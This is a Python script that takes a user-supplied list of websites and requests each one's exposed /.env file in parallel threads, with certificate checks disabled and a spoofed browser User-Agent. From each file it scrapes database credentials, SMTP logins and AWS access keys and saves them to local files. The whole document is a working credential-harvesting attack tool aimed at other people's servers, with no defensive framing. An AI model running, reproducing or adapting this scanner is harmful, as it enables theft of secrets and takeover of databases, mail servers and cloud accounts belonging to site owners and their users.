import requests
import urllib3
import traceback
import socket
import os
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ChunkedEncodingError, ConnectionError, Timeout, TooManyRedirects

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

Smtp_keys = ["MAIL_HOST", "MAIL_PORT", "MAIL_USERNAME", "MAIL_PASSWORD", "MAIL_FROM_ADDRESS"]
SQL_keys = ["DB_CONNECTION", "DB_HOST", "DB_PORT", "DB_DATABASE", "DB_USERNAME", "DB_PASSWORD"]
AWS_keys = ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"]

def is_resolvable(domain):
    try:
        socket.gethostbyname(domain)
        return True
    except socket.error:
        return False

def contains_any_keys(content, keys):
    return any(key in content for key in keys)

def process_link(link):
    try:
        link = link.strip()
        if not link:
            return

        if not link.startswith('http'):
            full_link = f'http://{link}/.env'
        else:
            full_link = f'{link}/.env'

        print(f"Trying {full_link}")

        parts = full_link.split('/')
        if len(parts) < 3:
            print(f"Invalid URL format: {full_link}")
            return

        domain = parts[2]
        if not is_resolvable(domain):
            print(f"Domain resolution failed for {domain}")
            return

        for attempt in range(3):  # Retry mechanism
            try:
                response = requests.get(full_link, headers=headers, timeout=4, verify=False, allow_redirects=True)
                print(f"Status Code: {response.status_code}")

                if response.history:
                    print(f"{full_link} redirected to {response.url}. Skipping.")
                    return

                if response.status_code == 200:
                    content = response.text
                    print(f"Content fetched from {full_link}:\n{content[:500]}")

                    if not contains_any_keys(content, SQL_keys + Smtp_keys + AWS_keys):
                        print(f"No relevant keys found in {full_link}. Skipping.")
                        return

                    with open('env.txt', 'w', encoding='utf-8') as content_file:
                        content_file.write(content)
                        content_file.write('\n' + '*' * 20 + '\n\n')
                    print(f'{full_link} ===> Content Extract Done!')

                    db_rslt = []
                    smtp_rslt = []
                    aws_rslt = []

                    with open("env.txt", 'r', encoding='utf-8', errors='ignore') as lines:
                        for line in lines:
                            line = line.strip()
                            for key in SQL_keys + Smtp_keys + AWS_keys:
                                if key in Smtp_keys and line.startswith(key + '='):
                                    smtp_rslt.append(line)
                                    break
                                elif key in SQL_keys and line.startswith(key + '='):
                                    db_rslt.append(line)
                                    break
                                elif key in AWS_keys and line.startswith(key + '='):
                                    if line not in aws_rslt:
                                        aws_rslt.append(line)

                    with open('rz/db_host.txt', 'a', encoding='utf-8') as host_file:
                        for line in db_rslt:
                            host_file.write(line + '\n')
                        host_file.write('*' * 20 + '\n\n')
                    print("Data written to db_host.txt successfully!")

                    with open('rz/smtp.txt', 'a', encoding='utf-8') as smtp_file:
                        for line in smtp_rslt:
                            smtp_file.write(line + '\n')
                        smtp_file.write('*' * 20 + '\n\n')
                    print("Data written to smtp.txt successfully!")

                    with open('rz/aws.txt', 'a', encoding='utf-8') as aws_file:
                        for line in aws_rslt:
                            aws_file.write(line + '\n')
                        aws_file.write('*' * 20 + '\n\n')
                    print("Data written to aws.txt successfully!")
                    break  # Break out of the retry loop if successful

            except ChunkedEncodingError as e:
                print(f"ChunkedEncodingError for {full_link}: {e}")
                if attempt == 2:
                    raise
            except ConnectionError as ce:
                print(f"Connection error for {full_link}: {ce}")
                if attempt == 2:
                    raise
            except Timeout:
                print(f'Timeout for {link}')
                if attempt == 2:
                    raise
            except TooManyRedirects:
                print(f"Exceeded the number of redirects for {full_link}")
                if attempt == 2:
                    raise
            except Exception as e:
                print(f"Error processing {full_link}: {e}")
                print(traceback.format_exc())
                if attempt == 2:
                    raise

    except Exception as e:
        print(f"Unexpected error: {e}")
        print(traceback.format_exc())

def main():
    try:
        if not os.path.exists('rz'):
            os.makedirs('rz')
        domino = input('WEBSITES file: ')
        with open(domino, 'r', encoding='utf-8', errors='ignore') as site_list:
            links = site_list.readlines()

        with ThreadPoolExecutor(max_workers=8) as executor:
            executor.map(process_link, links)

    except IOError as e:
        print(f"Error reading or writing file: {e}")
        print(traceback.format_exc())

    except Exception as e:
        print(f"Unexpected error: {e}")
        print(traceback.format_exc())

if __name__ == "__main__":
    main()
